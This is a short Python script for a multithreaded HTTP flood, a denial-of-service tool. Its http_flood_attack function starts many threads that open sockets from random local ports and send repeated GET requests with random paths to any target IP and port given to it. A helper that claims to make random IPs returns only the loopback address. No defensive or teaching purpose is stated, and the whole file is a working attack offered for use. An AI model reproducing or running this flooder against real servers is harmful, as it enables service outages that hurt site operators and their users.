import random
import socket
import threading
import string

def generate_random_ip():
    """Generate a random IP address (loopback address 127.0.0.1)"""
    return "127.0.0.1"

def generate_random_port():
    """Generate a random port number between 1024 and 65535"""
    return random.randint(1024, 65535)

def generate_random_url():
    """Generate a random URL with 5 characters"""
    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    return f"/{random_chars}"

def send_http_request(target_ip, target_port, random_port):
    """Simulate sending a random HTTP request"""
    try:
        # Create a socket object and bind it to a random port
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", random_port))  # Bind to random port on localhost
            s.connect((target_ip, target_port))

            # Construct an HTTP GET request with a random URL
            request = f"GET {generate_random_url()} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += "Connection: keep-alive\r\n\r\n"

            # Send the request
            s.sendall(request.encode())
            
            # Print the connection and content in the desired format
            print(f"Connected by {s.getsockname()} Content is b '{request.encode()}'")
            s.close()

    except Exception as e:
        print(f"Error in sending request: {e}")

def http_flood_attack(target_ip, target_port, num_threads, num_requests_per_thread):
    """Flood the target server with HTTP requests using multiple threads"""
    def attack_thread():
        for _ in range(num_requests_per_thread):
            random_port = generate_random_port()
            send_http_request(target_ip, target_port, random_port)

    # List to hold threads
    threads = []

    # Create and start threads
    for i in range(num_threads):
        t = threading.Thread(target=attack_thread)
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("HTTP flood attack completed.")
